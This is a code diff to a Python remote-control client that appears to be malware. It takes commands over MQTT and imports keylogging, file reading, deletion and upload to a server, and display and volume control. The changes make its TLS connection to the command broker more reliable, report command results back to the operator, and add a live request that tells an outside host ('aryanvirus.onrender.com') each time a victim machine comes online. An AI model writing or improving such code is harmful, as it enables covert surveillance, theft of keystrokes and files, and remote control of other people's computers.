@@ -12,7 +12,6 @@ import requests
 import shutil
 from pathlib import Path
 import sys
-import ssl
 import traceback
 import winsound
 # Function imports
@@ -22,6 +21,29 @@ from prompt import alertPrompt, inputPrompt
 from klogging import start_logging,stop_logging
 from filecontrol import list_folder,read_file,delete_file,create_file,send_file_to_server
 from systemcontrol import display_off,display_on,full_volume,mute_volume ,set_wallpaper_from_url
+
+CA_CERT = """-----BEGIN CERTIFICATE-----
+MIIDjjCCAnagAwIBAgIQAzrx5qcRqaC7KGSxHQn65TANBgkqhkiG9w0BAQsFADBh
+MQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3
+d3cuZGlnaWNlcnQuY29tMSAwHgYDVQQDExdEaWdpQ2VydCBHbG9iYWwgUm9vdCBH
+MjAeFw0xMzA4MDExMjAwMDBaFw0zODAxMTUxMjAwMDBaMGExCzAJBgNVBAYTAlVT
+MRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5j
+b20xIDAeBgNVBAMTF0RpZ2lDZXJ0IEdsb2JhbCBSb290IEcyMIIBIjANBgkqhkiG
+9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuzfNNNx7a8myaJCtSnX/RrohCgiN9RlUyfuI
+2/Ou8jqJkTx65qsGGmvPrC3oXgkkRLpimn7Wo6h+4FR1IAWsULecYxpsMNzaHxmx
+1x7e/dfgy5SDN67sH0NO3Xss0r0upS/kqbitOtSZpLYl6ZtrAGCSYP9PIUkY92eQ
+q2EGnI/yuum06ZIya7XzV+hdG82MHauVBJVJ8zUtluNJbd134/tJS7SsVQepj5Wz
+tCO7TG1F8PapspUwtP1MVYwnSlcUfIKdzXOS0xZKBgyMUNGPHgm+F6HmIcr9g+UQ
+vIOlCsRnKPZzFBQ9RnbDhxSJITRNrw9FDKZJobq7nMWxM4MphQIDAQABo0IwQDAP
+BgNVHRMBAf8EBTADAQH/MA4GA1UdDwEB/wQEAwIBhjAdBgNVHQ4EFgQUTiJUIBiV
+5uNu5g/6+rkS7QYXjzkwDQYJKoZIhvcNAQELBQADggEBAGBnKJRvDkhj6zHd6mcY
+1Yl9PMWLSn/pvtsrF9+wX3N3KjITOYFnQoQj8kVnNeyIv/iPsGEMNKSuIEyExtv4
+NeF22d+mQrvHRAiGfzZ0JFrabA0UWTW98kndth/Jsw1HKj2ZL7tcu7XUIOGZX1NG
+Fdtom/DzMNU+MeKNhJ7jitralj41E6Vf8PlwUHBHQRFXGU7Aj64GxJUTFy8bJZ91
+8rGOmaFvE7FBcf6IKshPECBV1/MUReXgRPTqh5Uykw7+U0b6LJ3/iyK5S9kJRaTe
+pLiaWN0bfVKfjllDiIGknibVb63dDcY3fe0Dkhvld1927jyNxF1WW6LZZm6zNTfl
+MrY=
+-----END CERTIFICATE-----"""
 
 def resource_path(relative_path):
     # Works for both PyInstaller EXE and dev Python
@@ -213,7 +235,10 @@ def handle_msg(msg):
 
         elif msg.startswith("urlwallpaper"):
             link = msg[len("urlwallpaper "):]
-            safe_thread(set_wallpaper_from_url,link)    
+            def setw():
+                res=set_wallpaper_from_url(link)
+                client.publish(ACK_TOPIC, f"Set Wallpaper {pc_id}: {res}")
+            safe_thread(setw)    
 
         elif msg.startswith("remap"):
             parts = msg[len("remap "):].split()
@@ -364,6 +389,7 @@ def on_connect(client, userdata, flags, rc):
     print(f"{pc_id} Connected to MQTT broker, code: {rc}")
     client.subscribe(CONTROL_TOPIC)
     client.publish(ACK_TOPIC, f"{pc_id} Connected")
+    # requests.get(f"https://aryanvirus.onrender.com/notify?msg={pc_id} : Connected")
 
 def on_message(client, userdata, message):
     msg = message.payload.decode()
@@ -387,11 +413,13 @@ def on_disconnect(client, userdata, rc):
 
 
 # MQTT client setup
-client = mqtt.Client(client_id=pc_id, protocol=mqtt.MQTTv311)
+client = mqtt.Client()
 client.username_pw_set(USERNAME, PASSWORD)
 # ca_path = resource_path("emqxsl-ca.crt")
 # client.tls_set(ca_certs=ca_path, cert_reqs=ssl.CERT_REQUIRED)
 # client.tls_insecure_set(True)
+client.tls_set()                # Use system CA store
+client.tls_insecure_set(False)  # Verify certificates
 client.on_connect = on_connect
 client.on_message = on_message
 client.on_disconnect = on_disconnect
@@ -420,6 +448,7 @@ def connect_mqtt_nonblocking():
             try:
                 client.connect(BROKER, PORT, 300)
                 print("MQTT connected successfully.")
+                requests.get(f"https://aryanvirus.onrender.com/notify?msg={pc_id} : Connected")
                 break
             except Exception as e:
                 print(f"MQTT connection failed: {e}, retrying in {delay}s...")
